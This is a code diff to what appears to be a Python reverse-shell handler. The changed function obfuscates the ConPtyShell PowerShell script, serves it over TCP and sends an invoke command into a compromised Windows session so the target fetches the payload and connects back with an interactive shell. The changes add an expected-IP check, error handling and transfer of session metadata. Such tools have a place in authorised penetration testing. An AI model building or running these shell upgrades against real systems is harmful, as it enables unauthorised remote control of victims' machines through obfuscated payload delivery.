@@ -17,7 +17,6 @@ _CONPTYSHELL_URL = (
     "/master/Invoke-ConPtyShell.ps1"
 )
 
-# Timeouts and delays
 _TCP_SERVER_TIMEOUT = 60.0
 _CONPTY_WAIT_TIMEOUT = 30.0
 _CONPTY_INIT_SLEEP = 0.3
@@ -78,7 +77,9 @@ def upgrade_windows_conptyshell(
 
     ps1_data, conpty_fn = obfuscate_conptyshell(ps1_data)
 
-    tcp_port, thread, errors = spawn_send_server(ps1_data, timeout=_TCP_SERVER_TIMEOUT)
+    tcp_port, thread, errors = spawn_send_server(
+        ps1_data, timeout=_TCP_SERVER_TIMEOUT, expected_ip=sess.addr[0]
+    )
     notify('info', f"Serving ConPtyShell on TCP port {bold(tcp_port)}")
 
     invoke_cmd = _build_invoke_cmd(local_ip, tcp_port, port, rows, cols, conpty_fn)
@@ -91,7 +92,10 @@ def upgrade_windows_conptyshell(
         logger.log_event("upgrade_start")
 
     pending_conpty[sess.addr[0]] = (sess.os_type, time.monotonic() + _CONPTY_WAIT_TIMEOUT)
-    sess.send((invoke_cmd + "\r\n").encode(sess.encoding, errors="replace"))
+    if not sess.send((invoke_cmd + "\r\n").encode(sess.encoding, errors="replace")):
+        pending_conpty.pop(sess.addr[0], None)
+        notify('error', f"Session {accent(f'#{sess.id}')} died before ConPtyShell could be invoked.")
+        return
 
     new_sess = None
     try:
@@ -110,13 +114,17 @@ def upgrade_windows_conptyshell(
             stale.close()
 
     if new_sess is None:
-        notify('error', "ConPtyShell did not connect back in time.")
+        detail = f" ({errors[0]})" if errors else ""
+        notify('error', f"ConPtyShell did not connect back in time.{detail}")
         return
 
     old_id = sess.id
+    new_sess.id = old_id
+    new_sess.tag = sess.tag
+    new_sess.connected_at = sess.connected_at
+    new_sess.log_path = sess.log_path
     sess.close()
     sessions.pop(old_id, None)
-    new_sess.id = old_id
     sessions[old_id] = new_sess
 
     new_sess.upgraded = True
